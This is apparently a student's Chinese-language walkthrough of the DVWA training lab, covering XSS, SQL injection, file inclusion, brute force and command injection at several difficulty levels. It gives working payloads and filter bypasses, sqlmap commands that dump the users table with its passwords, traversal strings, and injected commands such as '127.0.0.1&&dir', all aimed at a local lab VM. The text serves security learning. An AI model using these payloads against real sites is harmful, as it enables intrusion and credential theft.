## XSS（反射型）

### low

1.发现是get方法

![截图录屏_选择区域_20210127161139](E:\笔记\总结\靶场\DVWA\截图录屏_选择区域_20210127161139.png)

2.输入`<script>alert(1)</script>`,发现弹窗

![截图录屏_选择区域_20210127161330](E:\笔记\图片\截图录屏_选择区域_20210127161330.png)

![截图录屏_选择区域_20210127161439](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127161439.png)

查看源代码发现name这个变量没有经过任何特殊的过滤就直接输出在页面上

### medium

1.在输入框中输入`<script>alert(1)</script>`,没有弹窗

![截图录屏_选择区域_20210127163303](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127163303.png)

2.查看源代码，发现`<script>`被替换成空格了

![截图录屏_选择区域_20210127163424](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127163424.png)

3.换成大写的，输入`<SCRIPT>alert(1)</SCRIPT>`,发现弹窗

![截图录屏_选择区域_20210127163625](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127163625.png)

### high

1.查看源代码发现对含有`<script>`中的字母进行了过滤

![截图录屏_选择区域_20210127171524](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127171524.png)

2.使用`<img>`标签

在输入框中输入`<img src=# onclick=alert(1)>`,点击图片后发现弹窗

![截图录屏_选择区域_20210127171935](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127171935.png)

## XSS（DOM）

### low

1.low级别是下拉式，而且是get方法获取

![截图录屏_选择区域_20210127161935](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127161935.png)

2.直接在网址上`default=`后输入`<script>alert(1)</script>`，发现弹窗

![截图录屏_选择区域_20210127162116](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127162116.png)

### medium

1.medium是下拉式

查看源代码发现对default中的`<script`进行了过滤

![截图录屏_选择区域_20210127163846](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127163846.png)

2.在地址栏输入大写的，在default后输入`<SCRIPT>alert(1)</SCRIPT>`

发现仍然不行

3.查看前端源代码

![截图录屏_选择区域_20210127165510](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127165510.png)

4.使用`<img>`标签，并闭合`<option>`和`<select>`

在地址栏的`default=`后输入`english'></option></select><img src=# onclick=alert(1)>`

![截图录屏_选择区域_20210127165921](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127165921.png)

点击该图片，出现了弹窗

![截图录屏_选择区域_20210127165930](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127165930.png)

### high

1.查看源代码，发现只要不是列出项就跳到`English`那一项

![截图录屏_选择区域_20210127172130](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127172130.png)

2.在`default=English`后加`#<script>alert(1)</script>`

因为#后的内容不被服务器执行，而是直接与浏览器页面进行交互

![截图录屏_选择区域_20210127172913](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127172913.png)

## XSS（存储型）

### low

1.界面类似留言榜

![截图录屏_选择区域_20210127162251](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127162251.png)

2.直接在Message中输入`<script>alert(1)</script>`,发现弹窗

![截图录屏_选择区域_20210127162725](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127162725.png)

![截图录屏_选择区域_20210127163016](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127163016.png)

查看源代码，发现message和name两个变量没有经过任何特殊过滤直接存到数据库中

下次再输入，还会弹窗

![截图录屏_选择区域_20210127163147](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127163147.png)

### medium

1.查看源代码发现对message进行了许多过滤，但是name是将`<script>`进行了替换

可以输入大写`<SCRIPT>`

![截图录屏_选择区域_20210127170426](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127170426.png)

2.在输入时发现对name的长度进行了限制

![截图录屏_选择区域_20210127170957](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127170957.png)

3.修改`length=50`，并在name框中输入`<SCRIPT>alert(1)</SCRIPT>`,发现弹窗

![截图录屏_选择区域_20210127171312](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127171312.png)

### high

1.查看源代码发现name将`<script>`中的每个字母进行了过滤

![截图录屏_选择区域_20210127173056](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127173056.png)

2.将name的长度改为50,使用`<img>`标签

![截图录屏_选择区���_20210127173333](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127173333.png)

在name中输入`<img src=# onclick=alert(1)>`，点击图片后出现弹框

![截图录屏_选择区域_20210127173419](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127173419.png)

## SQL注入

### low

1.low级别的是get方式

![截图录屏_选择区域_20210127140445](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127140445.png)

2.直接使用sqlmap，发现要使用cookie维持会话

![截图录屏_选择区域_20210127141013](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127141013.png)

3.获取cookie

![截图录屏_选择区域_20210127132823](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127132823.png)

4.获取数据库

```
D:\sqlmap>sqlmap.py "http://192.168.120.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=prasunu4qhs3eutb08uj24r3p0 " -batch --dbs
```

![截图录屏_选择区域_20210127142003](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127142003.png)

![截图录屏_选择区域_20210127141851](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127141851.png)

发现有dvwa数据库

5.在dvwa库中获取数据表

```
D:\sqlmap>sqlmap.py "http://192.168.120.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=prasunu4qhs3eutb08uj24r3p0 " -batch -D dvwa --tables
```

![截图录屏_选择区域_20210127142211](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127142211.png)

发现有users和guestbook两个表，猜测数据在users表中

6.在users表中获取列

```
D:\sqlmap>sqlmap.py "http://192.168.120.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=prasunu4qhs3eutb08uj24r3p0 " -batch -D dvwa -T users --columns
```

![截图录屏_选择区域_20210127142442](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127142442.png)

发现user和password两个重要的列

7.获得user和password信息

```
D:\sqlmap>sqlmap.py "http://192.168.120.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=prasunu4qhs3eutb08uj24r3p0 " -batch -D dvwa -T users -C user,password --dump
```

![截图录屏_选择区域_20210127142708](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127142708.png)



### medium

1.medium是下拉式的，数据不能随便输入

![截图录屏_选择区域_20210127142823](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127142823.png)

2.进行抓包

![截图录屏_选择区域_20210127143753](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127143753.png)

发现是POST方式，发送的数据是`id=1&Submit=Submit`，所以在使用sqlmap时，可以作为输入的数据

3.使用sqlmap，寻找注入点

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0"
```

![截图录屏_选择区域_20210127144812](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127144812.png)

4.获取数据库

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch --dbs
```

![截图录屏_选择区域_20210127145004](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127145004.png)

5.获取数据表

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa --tables
```

![截图录屏_选择区域_20210127145226](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127145226.png)

6.在数据表users中获得列

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users --columns
```

![截图录屏_选择区域_20210127145404](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127145404.png)

7.获取user和password的信息

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users -C user,password --dump
```

![截图录屏_选择区域_20210127145554](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127145554.png)

### high

1.high级别要在第一个页面点击链接，然后在另一个页面进行查询，结果返回给第一个页面

![截图录屏_选择区域_20210127145833](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127145833.png)

查看源代码发现只要$_SESSION['id']存在，就进行查询

![截图录屏_选择区域_20210127150538](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127150538.png)

2.获取cookie

![截图录屏_选择区域_20210127150923](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127150923.png)

3.使用sqlmap，查找注入点

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0"
```

![截图录屏_选择区域_20210127151230](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127151230.png)

4.获取数据库

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch --dbs
```

![截图录屏_选择区域_20210127151354](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127151354.png)

5.获取dvwa中的表

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa --tables
```

![截图录屏_选择区域_20210127151524](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127151524.png)

6.获取users表中的列

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users --columns
```

![截图录屏_选择区域_20210127151703](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127151703.png)

7.获取user和password的信息

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli/" --data "id=1&Submit=Submit" --cookie "security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users -C user,password --dump
```

![截图录屏_选择区域_20210127151827](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127151827.png)

## SQL盲注

### low

1.low级别输入id，验证输入的id是否存在数据库

![截图录屏_选择区域_20210127152012](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127152012.png)

2.抓包查看信息

![截图录屏_选择区域_20210127152418](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127152418.png)

3.使用sqlmap，查找注入点

![截图录屏_选择区域_20210127152632](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127152632.png)

4.获取数据库

```
D:\sqlmap>sqlmap.py -u "192.168.120.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch --dbs
```

![截图录屏_选择区域_20210127152837](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127152837.png)

5.在dvwa库中获取数据表

```
D:\sqlmap>sqlmap.py -u "192.168.120.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa --tables
```

6.在users表中获取列

```
D:\sqlmap>sqlmap.py -u "192.168.120.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users --columns
```

![截图录屏_选择区域_20210127153156](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127153156.png)

7.获取user和password的信息

```
D:\sqlmap>sqlmap.py -u "192.168.120.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users -C user,password --dump
```

![截图录屏_选择区域_20210127153644](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127153644.png)

### medium

1.medium级别是下拉框

![截图录屏_选择区域_20210127153735](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127153735.png)

2.抓包查看信息

![截图录屏_选择区域_20210127153858](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127153858.png)

3.使用sqlmap，查找注入点

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch
```

![截图录屏_选择区域_20210127154411](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127154411.png)

4.获取数据库

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch --dbs
```

![截图录屏_选择区域_20210127154618](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127154618.png)

5.获取dvwa库中的数据表

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa --tables
```

![截图录屏_选择区域_20210127154757](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127154757.png)

6.获取users表中的列

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users --columns
```

![截图录屏_选择区域_20210127154949](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127154949.png)

7.获取user和password的信息

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "security=medium; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users -C user,password --dump
```

![截图录屏_选择区域_20210127155109](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127155109.png)

### high

1.high级别的查询和结果显示在不同的页面

![截图录屏_选择区域_20210127155208](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127155208.png)

2.抓包查看信息

![截图录屏_选择区域_20210127155527](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127155527.png)

3.使用sqlmap查找注入点

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "id=1; security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch
```

![截图录屏_选择区域_20210127155831](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127155831.png)

4.获取数据库

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "id=1; security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch --dbs
```

![截图录屏_选择区域_20210127155934](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127155934.png)

5.获取dvwa库中的表

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "id=1; security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa --tables
```

![截图录屏_选择区域_20210127160100](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127160100.png)

6.获取user表中的列

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "id=1; security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users --columns
```

![截图录屏_选择区域_20210127160212](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127160212.png)

7.获取user和password的信息

```
D:\sqlmap>sqlmap.py -u "http://192.168.120.129/dvwa/vulnerabilities/sqli_blind/" --data "id=1&Submit=Submit" --cookie "id=1; security=high; PHPSESSID=prasunu4qhs3eutb08uj24r3p0" --batch -D dvwa -T users -C user,password --dump
```

![截图录屏_选择区域_20210127160330](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210127160330.png)

## 文件包含

1.enable问题

打开发现提示为不允许

![截图录屏_选择区域_20210128194819](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128194819.png)

在phpstudy中进行设置

![截图录屏_选择区域_20210128195138](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128195138.png)

然后刷新即可

![截图录屏_选择区域_20210128195149](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128195149.png)

2.点开就成impossible

设置low级别，点击文件包含那一项就成impossible

抓包发现cookie里有两个安全等级

![截图录屏_选择区域_20210128203429](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128203429.png)

重启服务器后发现正常

### low

1.点击三个文件，发现会读取ip和系统信息，在地址栏发现有`page=file3.php`，说明当前文件就是被包含的文件

![截图录屏_选择区域_20210128200430](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128200430.png)

2.本地文件包含

绝对地址

直接在`page=`后输入本地文件地址

![截图录屏_选择区域_20210128204846](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128204846.png)

相对地址

还是刚才那个文件，使用相对地址

![截图录屏_选择区域_20210128205330](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128205330.png)

3.远程文件包含

开启一台虚拟机，在上面开启web服务

![截图录屏_选择区域_20210128210100](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128210100.png)

4.查看源代码，发现没有`page`变量没有任何过滤

![截图录屏_选择区域_20210128210301](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128210301.png)

### medium

1.本地文件包含

绝对路径

进行绝对路径包含时，没有受到限制

![截图录屏_选择区域_20210128210454](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128210454.png)

相对路径

进行相对路径包含时，发现无法包含

![截图录屏_选择区域_20210128210831](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128210831.png)

猜测可能是`../`被过滤了，在`../`中再套用`../`，即表达成`..././`，即使中间的被过滤，还有剩下的组成路径

![截图录屏_选择区域_20210128211036](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128211036.png)

发现可以进行包含

2.远程文件包含

![截图录屏_选择区域_20210128211347](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128211347.png)

发现没法包含，猜测`http`可能被过滤，使用套用形式`hthttptp`

![截图录屏_选择区域_20210128211532](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128211532.png)

发现仍然不行，猜测`http://`被过滤，使用套用形式`htthttp://p://`

![截图录屏_选择区域_20210128211644](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128211644.png)

发现可以进行包含

3.查看源代码

![截图录屏_选择区域_20210128212746](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128212746.png)

将`page=`后所接的`http://`,`https://`,`../`,`..\`进行过滤

### high

在进行包含时，发现被过滤

![截图录屏_选择区域_20210128211813](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128211813.png)

查看源代码

![截图录屏_选择区域_20210128212239](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128212239.png)

发现文件如果不是以`file`开头或者不是`include.php`就会提示错误

使用file协议

![截图录屏_选择区域_20210128212604](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128212604.png)

发现可以包含

## web爆破

### low

1.打开页面随意输入用户名和密码，发现错误

![截图录屏_选择区域_20210128213630](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128213630.png)

2.进行抓包

![截图录屏_选择区域_20210128214046](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128214046.png)

3.发送到`Intruder`模块

action->send to Intruder

将要破解的用户名和密码加上`$`符号

![截图录屏_选择区域_20210128222348](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128222348.png)

导入密码字典

![截图录屏_选择区域_20210128222704](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128222704.png)

开始暴力破解，发现有一个包的长度不同

![截图录屏_选择区域_20210128224048](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128224048.png)

使用对应的用户名和密码，发现登录成功

![截图录屏_选择区域_20210128224250](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128224250.png)

### medium

1.进行抓包，与low级别的操作相同

![截图录屏_选择区域_20210128224636](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128224636.png)

2.进行登录

![截图录屏_选择区域_20210128224831](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128224831.png)

### high

1.进行抓包

![截图录屏_选择区域_20210128224954](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128224954.png)

进行破解，发现包没有什么变化

![截图录屏_选择区域_20210128225121](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128225121.png)

并且界面出现

![截图录屏_选择区域_20210128225220](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128225220.png)

2.查看源代码

![截图录屏_选择区域_20210128225346](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128225346.png)

服务器每次返回登录页面都会给客户端产生一个随机的 Token 值，客户端登录时，需要携带该 Token，如果客户端与服务端产生的不一样，则会登录失败

3.将之前的抓包进行处理

攻击类型选择Pitchfork

![截图录屏_选择区域_20210128232356](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128232356.png)

用户名和密码导入密码字典，token设置如下

![截图录屏_选择区域_20210128232729](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128232729.png)

设置Grep-Extract

![截图录屏_选择区域_20210128233711](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128233711.png)

重定向设置

![截图录屏_选择区域_20210128233802](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128233802.png)

发现包的大小不同

![截图录屏_选择区域_20210128234312](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128234312.png)

4.进行登录

![截图录屏_选择区域_20210128234816](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20210128234816.png)

## 命令注入

首先要求输入ip地址

![截图录屏_选择区域_20210129202258](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129202258.png)

发现输入后为ping的结果，但是有乱码，这是编码不兼容的问题

![截图录屏_选择区域_20210129202437](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129202437.png)

打开在`dvwa/includes`目录下的`dvwaPage.inc.php`，将文件中所有的`charset=utf-8`，修改`charset=gb2312`即可

![截图录屏_选择区域_20210129202847](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129202847.png)

![截图录屏_选择区域_20210129203109](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129203109.png)

发现显示正常

![截图录屏_选择区域_20210129203133](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129203133.png)

### low

输入`dir`进行测试，发现`dir`被当成`ip`地址进行执行

![截图录屏_选择区域_20210129212004](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129212004.png)

在输入`ip`的同时还查询当前目录信息，输入`127.0.0.1&&dir`

![截图录屏_选择区域_20210129205443](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129205443.png)

输入`127.0.0.1&&ipconfig`查看当前ip信息

![截图录屏_选择区域_20210129211807](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129211807.png)

### medium

直接输入`127.0.0.1&&dir`进行测试，发现`127.0.0.1dir`被当作ip地址，也许`&&`被过滤

![截图录屏_选择区域_20210129205705](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129205705.png)

输入`127.0.0.1&dir`，发现可以输出路径信息

![截图录屏_选择区域_20210129205905](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129205905.png)

并且输入`127.0.0.1|dir`也可以输出目录信息

![截图录屏_选择区域_20210129210033](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129210033.png)

查看源代码，发现只对`&&`和`;`进行了过滤

![截图录屏_选择区域_20210129210152](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129210152.png)



### high

在输入栏中输入`127.0.0.1&&dir`,`127.0.0.1&dir`都会出现这样的情况

![截图录屏_选择区域_20210129210356](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129210356.png)

测试`127.0.0.1|dir`，发现输出文件信息

![截图录屏_选择区域_20210129210414](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129210414.png)

查看源代码，几乎都进行了过滤，但`|`还是可以过滤成功，因为下图中的`|`后有一个空格，而在实际中输入的是`127.0.0.1|dir`是没有空格的

![截图录屏_选择区域_20210129210636](/home/garlic//Desktop/笔记/图片/截图录屏_选择区域_20210129210636.png)

### 总结

* a&&b：先执行命令a然后执行命令b，但是前提条件是命令a执行正确才会执行命令b，在a执行失败的情况下不会执行b命令。

* a&b：先执行命令a再执行命令b，如果a执行失败，还是会继续执行命令b。

* ||：首先执行a命令在执行b命令，如果a命令执行成功，就不会执行b命令，相反，如果a命令执行不成功，就会执行b命令。

* |：代表首先执行a命令，在执行b命令，不管a命令成功与否，都会去执行b命令。

